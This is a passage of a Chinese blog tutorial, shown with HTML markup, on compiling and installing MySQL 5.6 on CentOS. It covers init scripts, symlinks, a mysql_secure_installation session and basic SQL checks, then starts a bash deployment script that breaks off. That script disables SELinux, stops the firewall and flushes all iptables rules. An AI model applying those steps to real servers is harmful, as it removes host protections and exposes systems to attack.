class="line">bin&#xA0;data&#xA0;include&#xA0;lib&#xA0;my.cnf&#xA0;README&#xA0;share&#xA0;support&#x2010;files</span><br><span class="line">COPYING&#xA0;docs&#xA0;INSTALL&#x2010;BINARY&#xA0;man&#xA0;mysql&#x2010;test&#xA0;scripts&#xA0;sql&#x2010;bench&#xA0;var</span><br><span class="line">[root@localhost&#xA0;mysql]#&#xA0;ln&#xA0;&#x2010;s&#xA0;my.cnf&#xA0;/etc/my.cnf</span><br><span class="line">[root@localhost&#xA0;mysql]#&#xA0;cp&#xA0;./support&#x2010;files/mysql.server&#xA0;/etc/rc.d/init.d/mysqld</span><br><span class="line">[root@localhost&#xA0;mysql]#&#xA0;chmod&#xA0;755&#xA0;/etc/rc.d/init.d/mysqld</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x7F16;&#x8F91;&#x521A;&#x521A;&#x590D;&#x5236;&#x7684;MySQL&#x6570;&#x636E;&#x5E93;&#x811A;&#x672C;&#x6587;&#x4EF6;&#xFF0C;&#x628A;&#x7B2C;46&#x3001;47&#x884C;&#x7684;basedir&#x4E0E;datadir&#x53C2;&#x6570;&#x5206;&#x522B;&#x4FEE;&#x6539;<br>&#x4E3A;MySQL&#x6570;&#x636E;&#x5E93;&#x7A0B;&#x5E8F;&#x7684;&#x4FDD;&#x5B58;&#x76EE;&#x5F55;&#x548C;&#x771F;&#x5B9E;&#x6570;&#x636E;&#x5E93;&#x7684;&#x6587;&#x4EF6;&#x5185;&#x5BB9;<br></p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost&#xA0;mysql]#&#xA0;vim&#xA0;/etc/rc.d/init.d/mysqld</span><br><span class="line">&#xA0;46&#xA0;basedir=/usr/local/mysql</span><br><span class="line">&#xA0;47&#xA0;datadir=/usr/local/mysql/var</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x914D;&#x7F6E;&#x597D;&#x811A;&#x672C;&#x6587;&#x4EF6;&#x540E;&#x4FBF;&#x53EF;&#x4EE5;&#x7528;service&#x547D;&#x4EE4;&#x542F;&#x52A8;mysqld&#x6570;&#x636E;&#x5E93;&#x670D;&#x52A1;&#x4E86;&#x3002;mysqld&#x662F;MySQL&#x6570;&#x636E;<br>&#x5E93;&#x7A0B;&#x5E8F;&#x7684;&#x670D;&#x52A1;&#x540D;&#x79F0;&#xFF0C;&#x6CE8;&#x610F;&#x4E0D;&#x8981;&#x5199;&#x9519;&#x3002;&#x518D;&#x4F7F;&#x7528;chkconfig&#x547D;&#x4EE4;&#x628A;mysqld&#x670D;&#x52A1;&#x7A0B;&#x5E8F;&#x52A0;&#x5165;&#x5230;&#x5F00;&#x673A;<br>&#x542F;&#x52A8;&#x9879;&#x4E2D;<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost&#xA0;mysql]#&#xA0;service&#xA0;mysqld&#xA0;start</span><br><span class="line">Unit&#xA0;mysqld.service&#xA0;could&#xA0;not&#xA0;be&#xA0;found.</span><br><span class="line">Starting&#xA0;MySQL.&#xA0;SUCCESS!</span><br><span class="line">[root@localhost&#xA0;mysql]#&#xA0;chkconfig&#xA0;mysqld&#xA0;on</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x5728;/etc/profile&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x7684;&#x6700;&#x540E;&#x52A0;&#x5165;export PATH=$PATH:/usr/local/mysql/bin<br></p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost&#xA0;mysql]#&#xA0;vim&#xA0;/etc/profile</span><br><span class="line">&#xA0;export&#xA0;PATH=$PATH:/usr/local/mysql/bin</span><br></pre></td></tr></tbody></table></figure><p></p><p>MySQL&#x6570;&#x636E;&#x5E93;&#x670D;&#x52A1;&#x7A0B;&#x5E8F;&#x8FD8;&#x4F1A;&#x8C03;&#x7528;&#x5230;&#x4E00;&#x4E9B;&#x7A0B;&#x5E8F;&#x6587;&#x4EF6;&#x548C;&#x51FD;&#x6570;&#x5E93;&#x6587;&#x4EF6;&#x3002;&#x7531;&#x4E8E;&#x5F53;&#x524D;&#x662F;&#x901A;&#x8FC7;&#x6E90;&#x7801;&#x5305;&#x65B9;&#x5F0F;&#x5B89;&#x88C5;MySQL&#x6570;&#x636E;&#x5E93;&#xFF0C;&#x56E0;&#x6B64;&#x73B0;&#x5728;&#x4E5F;&#x5FC5;&#x987B;&#x4EE5;&#x624B;&#x52A8;&#x65B9;&#x5F0F;&#x628A;&#x8FD9;&#x4E9B;&#x6587;&#x4EF6;&#x94FE;&#x63A5;&#x8FC7;&#x6765;<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost&#xA0;mysql]#&#xA0;mkdir&#xA0; /var/lib/mysql</span><br><span class="line">[root@localhost&#xA0;mysql]#&#xA0;ln&#xA0;&#x2010;s&#xA0;/usr/local/mysql/lib/mysql&#xA0; /usr/lib/mysql</span><br><span class="line">[root@localhost&#xA0;mysql]#&#xA0;ln&#xA0;&#x2010;s /var/lib/mysql/mysql.sock&#xA0; /tmp/mysql.sock&#xA0;</span><br><span class="line">[root@localhost&#xA0;mysql]#&#xA0;ln&#xA0;&#x2010;s&#xA0;/usr/local/mysql/include/mysql&#xA0; /usr/include/mysql</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x73B0;&#x5728;&#xFF0C;MySQL&#x6570;&#x636E;&#x5E93;&#x670D;&#x52A1;&#x7A0B;&#x5E8F;&#x5DF2;&#x7ECF;&#x542F;&#x52A8;&#xFF0C;&#x8C03;&#x7528;&#x7684;&#x5404;&#x4E2A;&#x51FD;&#x6570;&#x6587;&#x4EF6;&#x5DF2;&#x7ECF;&#x5C31;&#x4F4D;&#xFF0C;PATH&#x73AF;&#x5883;&#x53D8;&#x91CF;<br>&#x4E2D;&#x4E5F;&#x52A0;&#x5165;&#x4E86;MySQL&#x6570;&#x636E;&#x5E93;&#x547D;&#x4EE4;&#x7684;&#x6240;&#x5728;&#x76EE;&#x5F55;&#x3002;&#x63A5;&#x4E0B;&#x6765;&#x51C6;&#x5907;&#x5BF9;MySQL&#x6570;&#x636E;&#x5E93;&#x8FDB;&#x884C;&#x521D;&#x59CB;&#x5316;&#xFF0C;&#x8FD9;&#x4E2A;<br>&#x521D;&#x59CB;&#x5316;&#x7684;&#x914D;&#x7F6E;&#x8FC7;&#x7A0B;&#x4E0E;MariaDB&#x6570;&#x636E;&#x5E93;&#x662F;&#x4E00;&#x6837;&#x7684;&#xFF0C;&#x53EA;&#x662F;&#x6700;&#x540E;&#x53D8;&#x6210;&#x4E86;Thanks for using MySQL!</p><p><code>&#x6CE8;&#x610F;&#xFF1A;&#x5982;&#x679C; mysql_secure_installation &#x627E;&#x4E0D;&#x5230;&#xFF0C;&#x5219;&#x9700;&#x8981;&#x6267;&#x884C; source /etc/profile &#x540E;&#xFF0C;&#x518D;&#x6267;&#x884C; mysql_secure_installation &#x6765;&#x521D;&#x59CB;&#x5316;MySQL&#x6570;&#x636E;&#x5E93;&#xFF0C;&#x6216;&#x8005;&#x91CD;&#x65B0;&#x8FDE;&#x63A5; Linux &#x7CFB;&#x7EDF;&#x540E;&#x518D;&#x4F7F;&#x7528; mysql_secure_installation &#x6765;&#x521D;&#x59CB;&#x5316;MySQL&#x6570;&#x636E;&#x5E93;&#x3002;</code></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost&#xA0;~]#&#xA0;mysql_secure_installation</span><br><span class="line">NOTE:&#xA0;RUNNING&#xA0;ALL&#xA0;PARTS&#xA0;OF&#xA0;THIS&#xA0;SCRIPT&#xA0;IS&#xA0;RECOMMENDED&#xA0;FOR&#xA0;ALL&#xA0;MySQL</span><br><span class="line">SERVERS&#xA0;IN&#xA0;PRODUCTION&#xA0;USE!&#xA0;PLEASE&#xA0;READ&#xA0;EACH&#xA0;STEP&#xA0;CAREFULLY!</span><br><span class="line">In&#xA0;order&#xA0;to&#xA0;log&#xA0;into&#xA0;MySQL&#xA0;to&#xA0;secure&#xA0;it,&#xA0;we&apos;ll&#xA0;need&#xA0;the&#xA0;current</span><br><span class="line">password&#xA0;for&#xA0;the&#xA0;root&#xA0;user.&#xA0;If&#xA0;you&apos;ve&#xA0;just&#xA0;installed&#xA0;MySQL,&#xA0;and</span><br><span class="line">you&#xA0;haven&apos;t&#xA0;set&#xA0;the&#xA0;root&#xA0;password&#xA0;yet,&#xA0;the&#xA0;password&#xA0;will&#xA0;be&#xA0;blank,</span><br><span class="line">so&#xA0;you&#xA0;should&#xA0;just&#xA0;press&#xA0;enter&#xA0;here.</span><br><span class="line">Enter&#xA0;current&#xA0;password&#xA0;for&#xA0;root&#xA0;(enter&#xA0;for&#xA0;none):&#xA0;&#x6B64;&#x5904;&#x53EA;&#x9700;&#x6309;&#x4E0B;&#x56DE;&#x8F66;&#x952E;</span><br><span class="line">OK,&#xA0;successfully&#xA0;used&#xA0;password,&#xA0;moving&#xA0;on...</span><br><span class="line">Setting&#xA0;the&#xA0;root&#xA0;password&#xA0;ensures&#xA0;that&#xA0;nobody&#xA0;can&#xA0;log&#xA0;into&#xA0;the&#xA0;MySQL</span><br><span class="line">root&#xA0;user&#xA0;without&#xA0;the&#xA0;proper&#xA0;authorisation.</span><br><span class="line">Set&#xA0;root&#xA0;password?&#xA0;[Y/n]&#xA0;y&#xA0;&#xFF08;&#x8981;&#x4E3A;root&#x7BA1;&#x7406;&#x5458;&#x8BBE;&#x7F6E;&#x6570;&#x636E;&#x5E93;&#x7684;&#x5BC6;&#x7801;&#xFF09;</span><br><span class="line">New&#xA0;password:&#xA0;&#x8F93;&#x5165;&#x8981;&#x4E3A;root&#x7BA1;&#x7406;&#x5458;&#x8BBE;&#x7F6E;&#x7684;&#x6570;&#x636E;&#x5E93;&#x5BC6;&#x7801;</span><br><span class="line">Re&#x2010;enter&#xA0;new&#xA0;password:&#xA0;&#x518D;&#x8F93;&#x5165;&#x4E00;&#x6B21;&#x5BC6;&#x7801;</span><br><span class="line">Password&#xA0;updated&#xA0;successfully!</span><br><span class="line">Reloading&#xA0;privilege&#xA0;tables..</span><br><span class="line">...&#xA0;Success!</span><br><span class="line">By&#xA0;default,&#xA0;a&#xA0;MySQL&#xA0;installation&#xA0;has&#xA0;an&#xA0;anonymous&#xA0;user,&#xA0;allowing&#xA0;anyone</span><br><span class="line">to&#xA0;log&#xA0;into&#xA0;MySQL&#xA0;without&#xA0;having&#xA0;to&#xA0;have&#xA0;a&#xA0;user&#xA0;account&#xA0;created&#xA0;for</span><br><span class="line">them.&#xA0;This&#xA0;is&#xA0;intended&#xA0;only&#xA0;for&#xA0;testing,&#xA0;and&#xA0;to&#xA0;make&#xA0;the&#xA0;installation</span><br><span class="line">go&#xA0;a&#xA0;bit&#xA0;smoother.&#xA0;You&#xA0;should&#xA0;remove&#xA0;them&#xA0;before&#xA0;moving&#xA0;into&#xA0;a</span><br><span class="line">production&#xA0;environment.</span><br><span class="line">Remove&#xA0;anonymous&#xA0;users?&#xA0;[Y/n]&#xA0;y&#xA0;&#xFF08;&#x5220;&#x9664;&#x533F;&#x540D;&#x8D26;&#x6237;&#xFF09;</span><br><span class="line">...&#xA0;Success!</span><br><span class="line">Normally,&#xA0;root&#xA0;should&#xA0;only&#xA0;be&#xA0;allowed&#xA0;to&#xA0;connect&#xA0;from&#xA0;&apos;localhost&apos;.&#xA0;This</span><br><span class="line">ensures&#xA0;that&#xA0;someone&#xA0;cannot&#xA0;guess&#xA0;at&#xA0;the&#xA0;root&#xA0;password&#xA0;from&#xA0;the&#xA0;network.</span><br><span class="line">Disallow&#xA0;root&#xA0;login&#xA0;remotely?&#xA0;[Y/n]&#xA0;y&#xA0;&#xFF08;&#x7981;&#x6B62;root&#x7BA1;&#x7406;&#x5458;&#x4ECE;&#x8FDC;&#x7A0B;&#x767B;&#x5F55;&#xFF09;</span><br><span class="line">...&#xA0;Success!</span><br><span class="line">By&#xA0;default,&#xA0;MySQL&#xA0;comes&#xA0;with&#xA0;a&#xA0;database&#xA0;named&#xA0;&apos;test&apos;&#xA0;that&#xA0;anyone&#xA0;can</span><br><span class="line">access.&#xA0;This&#xA0;is&#xA0;also&#xA0;intended&#xA0;only&#xA0;for&#xA0;testing,&#xA0;and&#xA0;should&#xA0;be&#xA0;removed</span><br><span class="line">before&#xA0;moving&#xA0;into&#xA0;a&#xA0;production&#xA0;environment.</span><br><span class="line">Remove&#xA0;test&#xA0;database&#xA0;and&#xA0;access&#xA0;to&#xA0;it?&#xA0;[Y/n]&#xA0;y&#xA0;&#xFF08;&#x5220;&#x9664;test&#x6570;&#x636E;&#x5E93;&#x5E76;&#x53D6;&#x6D88;&#x5BF9;&#x5176;&#x7684;&#x8BBF;&#x95EE;&#x6743;&#x9650;&#xFF09;</span><br><span class="line">&#x2010;&#xA0;Dropping&#xA0;test&#xA0;database...</span><br><span class="line">...&#xA0;Success!</span><br><span class="line">&#x2010;&#xA0;Removing&#xA0;privileges&#xA0;on&#xA0;test&#xA0;database...</span><br><span class="line">...&#xA0;Success!</span><br><span class="line">Reloading&#xA0;the&#xA0;privilege&#xA0;tables&#xA0;will&#xA0;ensure&#xA0;that&#xA0;all&#xA0;changes&#xA0;made&#xA0;so&#xA0;far</span><br><span class="line">will&#xA0;take&#xA0;effect&#xA0;immediately.</span><br><span class="line">Reload&#xA0;privilege&#xA0;tables&#xA0;now?&#xA0;[Y/n]&#xA0;y&#xA0;&#xFF08;&#x5237;&#x65B0;&#x6388;&#x6743;&#x8868;&#xFF0C;&#x8BA9;&#x521D;&#x59CB;&#x5316;&#x540E;&#x7684;&#x8BBE;&#x5B9A;&#x7ACB;&#x5373;&#x751F;&#x6548;&#xFF09;</span><br><span class="line">...&#xA0;Success!</span><br><span class="line">All&#xA0;done!&#xA0;If&#xA0;you&apos;ve&#xA0;completed&#xA0;all&#xA0;of&#xA0;the&#xA0;above&#xA0;steps,&#xA0;your&#xA0;MySQL</span><br><span class="line">installation&#xA0;should&#xA0;now&#xA0;be&#xA0;secure.</span><br><span class="line">Thanks&#xA0;for&#xA0;using&#xA0;MySQL!</span><br><span class="line">Cleaning&#xA0;up...</span><br></pre></td></tr></tbody></table></figure><p>&#x767B;&#x5F55;MySQL&#x6570;&#x636E;&#x5E93;&#xFF0C;&#x505A;&#x7B80;&#x5355;&#x64CD;&#x4F5C;&#xFF0C;&#x9A8C;&#x8BC1;&#x6570;&#x636E;&#x5E93;&#x662F;&#x5426;&#x6B63;&#x5E38;<br></p><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"> [root@localhost&#xA0;~]<span class="comment">#&#xA0;mysql&#xA0;&#x2010;u&#xA0;root&#xA0;&#x2010;p</span></span><br><span class="line"> Enter&#xA0;password:</span><br><span class="line"> Welcome&#xA0;to&#xA0;the&#xA0;MySQL&#xA0;monitor.&#xA0;Commands&#xA0;<span class="keyword">end</span>&#xA0;<span class="keyword">with</span>&#xA0;;&#xA0;or&#xA0;\g.</span><br><span class="line"> Your&#xA0;MySQL&#xA0;connection&#xA0;id&#xA0;is&#xA0;12</span><br><span class="line"> Server&#xA0;version:&#xA0;5.6.19&#xA0;Source&#xA0;distribution</span><br><span class="line"></span><br><span class="line"> Copyright&#xA0;(c)&#xA0;2000,&#xA0;2014,&#xA0;Oracle&#xA0;and/or&#xA0;its&#xA0;affiliates.&#xA0;All&#xA0;rights&#xA0;reserv</span><br><span class="line">ed.</span><br><span class="line"></span><br><span class="line"> Oracle&#xA0;is&#xA0;a&#xA0;registered&#xA0;trademark&#xA0;of&#xA0;Oracle&#xA0;Corporation&#xA0;and/or&#xA0;its</span><br><span class="line"> affiliates.&#xA0;Other&#xA0;names&#xA0;may&#xA0;be&#xA0;trademarks&#xA0;of&#xA0;their&#xA0;respective</span><br><span class="line"> owners.</span><br><span class="line"></span><br><span class="line"> Type&#xA0;&apos;<span class="keyword">help</span>;&apos;&#xA0;or&#xA0;&apos;\h&apos;&#xA0;for&#xA0;help.&#xA0;<span class="keyword">Type</span>&#xA0;<span class="string">&apos;\c&apos;</span>&#xA0;<span class="keyword">to</span>&#xA0;<span class="keyword">clear</span>&#xA0;the&#xA0;<span class="keyword">current</span>&#xA0;<span class="keyword">input</span>&#xA0;stat</span><br><span class="line">ement.</span><br><span class="line"></span><br><span class="line"> mysql&gt;&#xA0;<span class="keyword">show</span>&#xA0;<span class="keyword">databases</span>;</span><br><span class="line"> +&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;+</span><br><span class="line"> |&#xA0;Database&#xA0;|</span><br><span class="line"> +&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;+</span><br><span class="line"> |&#xA0;information_schema&#xA0;|</span><br><span class="line"> |&#xA0;mysql&#xA0;|</span><br><span class="line"> |&#xA0;performance_schema&#xA0;|</span><br><span class="line"> +&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;+</span><br><span class="line"> 3&#xA0;rows&#xA0;in&#xA0;<span class="keyword">set</span>&#xA0;(<span class="number">0.00</span>&#xA0;sec)</span><br><span class="line"></span><br><span class="line"> mysql&gt;&#xA0;<span class="keyword">create</span>&#xA0;<span class="keyword">database</span>&#xA0;<span class="keyword">test</span>;</span><br><span class="line"> Query&#xA0;OK,&#xA0;1&#xA0;row&#xA0;affected&#xA0;(0.00&#xA0;sec)</span><br><span class="line"></span><br><span class="line"> mysql&gt;&#xA0;show&#xA0;databases;</span><br><span class="line"> +&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;+</span><br><span class="line"> |&#xA0;Database&#xA0;|</span><br><span class="line"> +&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;+</span><br><span class="line"> |&#xA0;information_schema&#xA0;|</span><br><span class="line"> |&#xA0;mysql&#xA0;|</span><br><span class="line"> |&#xA0;performance_schema&#xA0;|</span><br><span class="line"> |&#xA0;test&#xA0;|</span><br><span class="line"> +&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;+</span><br><span class="line"> 4&#xA0;rows&#xA0;in&#xA0;<span class="keyword">set</span>&#xA0;(<span class="number">0.00</span>&#xA0;sec)</span><br><span class="line"></span><br><span class="line"> mysql&gt;&#xA0;<span class="keyword">create</span>&#xA0;<span class="keyword">database</span>&#xA0;test2;</span><br><span class="line"> Query&#xA0;OK,&#xA0;1&#xA0;row&#xA0;affected&#xA0;(0.00&#xA0;sec)</span><br><span class="line"></span><br><span class="line"> mysql&gt;&#xA0;show&#xA0;databases;</span><br><span class="line"> +&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;+</span><br><span class="line"> |&#xA0;Database&#xA0;|</span><br><span class="line"> +&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;+</span><br><span class="line"> |&#xA0;information_schema&#xA0;|</span><br><span class="line"> |&#xA0;mysql&#xA0;|</span><br><span class="line"> |&#xA0;performance_schema&#xA0;|</span><br><span class="line"> |&#xA0;test&#xA0;|</span><br><span class="line"> |&#xA0;test2&#xA0;|</span><br><span class="line"> +&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;+</span><br><span class="line"> 5&#xA0;rows&#xA0;in&#xA0;<span class="keyword">set</span>&#xA0;(<span class="number">0.00</span>&#xA0;sec)</span><br><span class="line"></span><br><span class="line"> mysql&gt;&#xA0;<span class="keyword">drop</span>&#xA0;<span class="keyword">database</span>&#xA0;test2;</span><br><span class="line"> Query&#xA0;OK,&#xA0;0&#xA0;rows&#xA0;affected&#xA0;(0.00&#xA0;sec)</span><br><span class="line"></span><br><span class="line"> mysql&gt;&#xA0;show&#xA0;databases;</span><br><span class="line"> +&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;+</span><br><span class="line"> |&#xA0;Database&#xA0;|</span><br><span class="line"> +&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;+</span><br><span class="line"> |&#xA0;information_schema&#xA0;|</span><br><span class="line"> |&#xA0;mysql&#xA0;|</span><br><span class="line"> |&#xA0;performance_schema&#xA0;|</span><br><span class="line"> |&#xA0;test&#xA0;|</span><br><span class="line"> +&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;+</span><br><span class="line"> 4&#xA0;rows&#xA0;in&#xA0;<span class="keyword">set</span>&#xA0;(<span class="number">0.00</span>&#xA0;sec)</span><br><span class="line"></span><br><span class="line"> mysql&gt;</span><br></pre></td></tr></tbody></table></figure><p></p><h2 id="&#x7528;&#x811A;&#x672C;&#x5B89;&#x88C5;MySQL-5-6"><a href="#&#x7528;&#x811A;&#x672C;&#x5B89;&#x88C5;MySQL-5-6" class="headerlink" title="&#x7528;&#x811A;&#x672C;&#x5B89;&#x88C5;MySQL 5.6"></a>&#x7528;&#x811A;&#x672C;&#x5B89;&#x88C5;MySQL 5.6</h2> <figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"> [root@localhost src]# vim mysql.sh </span><br><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"><span class="meta">#</span><span class="bash">Explain:This is a script to quickly deploy the MySQL service.</span></span><br><span class="line"><span class="meta">#</span><span class="bash">Author:Jaking</span></span><br><span class="line"><span class="meta">#</span><span class="bash">Email:Jaking@vip.163.com</span></span><br><span class="line"><span class="meta">#</span><span class="bash">Date:2019-10-09</span></span><br><span class="line"><span class="meta">#</span><span class="bash">&#x6CE8;&#x610F;:&#x628A;&#x6240;&#x9700;&#x6E90;&#x7801;&#x5305;&#x653E;&#x5230;/usr/<span class="built_in">local</span>/src&#x76EE;&#x5F55;&#x4E0B;</span></span><br><span class="line"><span class="meta">#</span><span class="bash">&#x63A8;&#x8350;&#x5B89;&#x88C5;&#x5305;&#xFF1A;mysql-5.6.19.tar.gz cmake-2.8.11.2.tar.gz</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">&#x4F18;&#x5316;&#x73AF;&#x5883;</span></span><br><span class="line">sed -i &apos;s/SELINUX=enforcing/SELINUX=disabled/&apos; /etc/selinux/config &amp;&gt; /dev/null</span><br><span class="line">setenforce 0</span><br><span class="line">systemctl stop firewalld</span><br><span class="line">systemctl disable firewalld</span><br><span class="line">iptables -F</span><br><span class="line">systemctl stop NetworkManager &amp;&gt; /dev/null</span><br><span class="line">systemctl disable NetworkManager &amp;&gt; /dev/null</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span 